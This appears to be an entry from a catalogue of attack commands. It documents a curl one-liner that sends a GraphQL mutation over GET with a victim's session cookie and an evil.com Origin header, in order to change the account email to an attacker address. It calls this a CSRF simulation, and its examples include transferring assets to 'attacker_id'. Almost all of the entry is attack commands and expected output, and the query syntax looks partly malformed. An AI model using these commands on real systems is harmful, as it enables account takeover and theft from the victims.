---
id: cmd-998457-graphql-mutation
data: >-
  curl -X GET
  "https://target.com/graphql?query={mutation{updateUser(input:{email:\"hacked@evil.com\"})}{success}}"
  -H "Cookie: session=victim_session" -H "Origin: https://evil.com" -v
tags:
  - graphql
  - mutation
  - curl
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:42.836Z'
verified: false
validated: true
submitted: true
---
# curl-graphql-mutation

## Command

```bash
curl -X GET "https://target.com/graphql?query={mutation{updateUser(input:{email:\"hacked@evil.com\"})}{success}}" -H "Cookie: session=victim_session" -H "Origin: https://evil.com" -v
```

## Description

This command executes a GraphQL mutation via GET to perform unauthorized actions, simulating a CSRF attack with credentials and cross-origin headers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Uses GET for CSRF bypass | Yes |
| `query=...` | Encoded GraphQL mutation | Yes |
| `-H "Cookie: ..."` | Victim's session cookie | Yes |
| `-H "Origin: ..."` | Cross-origin simulation | Yes |
| `-v` | Verbose output | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/graphql?query={mutation{updateUser(input:{email:\"new@evil.com\"})}{id}}" -H "Cookie: session=abc" -v
```

### Advanced Usage

```bash
curl -X GET "https://target.com/graphql?query={mutation{transferAsset(to:\"attacker_id\")}{success}}" -H "Cookie: session=victim" -H "Origin: https://evil.com" -v
```

## Expected Output

JSON response like {"data":{"updateUser":{"success":true}}}, confirming execution.

## Related

- [[Related Procedure: Execute-Unauthorized-Actions-as-Victim]]
